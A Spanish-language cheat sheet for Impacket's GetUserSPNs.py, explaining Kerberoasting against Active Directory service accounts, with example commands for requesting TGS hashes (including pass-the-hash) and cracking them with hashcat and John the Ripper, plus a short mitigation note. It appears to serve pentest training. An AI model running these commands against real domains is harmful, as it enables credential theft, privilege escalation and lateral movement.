
# GetUserSPNs.py

## ¿Qué es GetUserSPNs.py?

`GetUserSPNs.py` es una herramienta de la suite de Impacket, utilizada para realizar un ataque conocido como **Kerberoasting**. Este ataque se enfoca en encontrar y extraer hashes de contraseñas de cuentas de servicio de Active Directory. Específicamente, busca cuentas de usuario que tengan un Nombre Principal de Servicio (SPN) asociado.

Un SPN es un identificador único para una instancia de servicio, que permite a un cliente encontrar ese servicio en la red. Cuando un servicio se ejecuta bajo el contexto de una cuenta de usuario (en lugar de una cuenta de máquina), su TGS (Ticket Granting Service) de Kerberos se cifra con el hash de la contraseña de esa cuenta de usuario.

## ¿Para qué es útil la herramienta?

Esta herramienta es fundamental para los pentesters y equipos de Red Team durante la fase de post-explotación (cuando ya se tiene acceso a la red interna con al menos una credencial de dominio válida). Su utilidad es:

- **Escalar privilegios:** Al obtener los hashes de las cuentas de servicio, un atacante puede intentar crackearlos offline. Si tiene éxito, obtiene las credenciales de una cuenta de servicio, que a menudo tiene privilegios elevados en el dominio.
- **Movimiento lateral:** Las credenciales de cuentas de servicio crackeadas pueden ser reutilizadas para acceder a otros sistemas y servicios dentro de la red.
- **Evasión de defensas:** El Kerberoasting es un ataque relativamente sigiloso, ya que utiliza interacciones legítimas de Kerberos y no genera alertas de intentos de inicio de sesión fallidos.

## ¿Cómo se usa?

Para realizar el ataque, se necesita al menos una cuenta de usuario y contraseña de dominio válida (no necesita ser privilegiada).

### Sintaxis básica

```bash
python3 GetUserSPNs.py -dc-ip <IP_del_DC> <dominio>/<usuario>:<contraseña> -request
```

- `-dc-ip <IP_del_DC>`: La dirección IP del controlador de dominio.
- `<dominio>/<usuario>:<contraseña>`: Credenciales válidas de un usuario del dominio.
- `-request`: Este es el parámetro clave que solicita los TGS para los SPNs encontrados.

### Ejemplos de uso

1.  **Encontrar SPNs y solicitar los TGS:**
    Este comando buscará todas las cuentas de usuario con SPNs en el dominio `midominio.local` y solicitará sus TGS, guardando los hashes en un archivo.
    ```bash
    python3 GetUserSPNs.py -dc-ip 10.10.10.1 midominio.local/user:Password123 -request > hashes_kerberoast.txt
    ```
    La salida en `hashes_kerberoast.txt` contendrá los hashes en un formato listo para ser crackeado.

2.  **Usar Pass-the-Hash:**
    Si en lugar de una contraseña, se tiene el hash NTLM de un usuario, también se puede realizar el ataque.
    ```bash
    python3 GetUserSPNs.py -dc-ip 10.10.10.1 -hashes :<hash_ntlm> midominio.local/user -request
    ```

## Cracking del hash con Hashcat o John the Ripper

El hash obtenido (que suele empezar con `$krb5tgs$23$*...`) se puede crackear offline.

- **Con Hashcat:**
  Se utiliza el modo `13100`.
  ```bash
  hashcat -m 13100 hashes_kerberoast.txt /usr/share/wordlists/rockyou.txt
  ```

- **Con John the Ripper:**
  ```bash
  john --wordlist=/usr/share/wordlists/rockyou.txt hashes_kerberoast.txt
  ```

## Otras consideraciones

- **Se requieren credenciales:** A diferencia de AS-REP Roasting (`GetNPUsers.py`), el Kerberoasting requiere credenciales de dominio válidas para poder solicitar los TGS.
- **Mitigación:** La principal forma de mitigar este ataque es asegurarse de que las cuentas de servicio utilicen contraseñas largas, complejas y que se roten periódicamente, haciendo que el cracking offline sea inviable.
